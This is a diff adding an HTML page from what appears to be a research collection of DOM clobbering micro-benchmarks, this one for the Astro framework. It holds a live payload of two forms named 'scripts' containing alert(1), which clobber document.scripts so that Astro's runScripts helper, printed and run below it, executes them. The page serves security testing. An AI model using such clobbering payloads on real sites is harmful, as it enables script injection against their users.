@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - astro</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;form name=&quot;scripts&quot;&gt;alert(1)&lt;/form&gt;
+&lt;form name=&quot;scripts&quot;&gt;alert(1)&lt;/form&gt;</pre>
+  <form name="scripts">alert(1)</form>
+<form name="scripts">alert(1)</form>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script&gt;
+function runScripts() {
+	for (const script of Array.from(document.scripts)) {
+		if (script.dataset.astroExec === &#x27;&#x27;) continue;
+		const type = script.getAttribute(&#x27;type&#x27;);
+		if (type &amp;&amp; type !== &#x27;module&#x27; &amp;&amp; type !== &#x27;text/javascript&#x27;) continue;
+		const newScript = document.createElement(&#x27;script&#x27;);
+		newScript.innerHTML = script.innerHTML;
+		for (const attr of script.attributes) {
+			newScript.setAttribute(attr.name, attr.value);
+		}
+		newScript.dataset.astroExec = &#x27;&#x27;;
+		script.replaceWith(newScript);
+	}
+}
+
+runScripts();
+&lt;/script&gt;</pre>
+  <script>
+function runScripts() {
+	for (const script of Array.from(document.scripts)) {
+		if (script.dataset.astroExec === '') continue;
+		const type = script.getAttribute('type');
+		if (type && type !== 'module' && type !== 'text/javascript') continue;
+		const newScript = document.createElement('script');
+		newScript.innerHTML = script.innerHTML;
+		for (const attr of script.attributes) {
+			newScript.setAttribute(attr.name, attr.value);
+		}
+		newScript.dataset.astroExec = '';
+		script.replaceWith(newScript);
+	}
+}
+
+runScripts();
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../doomcaptcha/poc.html">Next: doomcaptcha</a>
+  </div>
+</section>
+
+</body>
+</html>
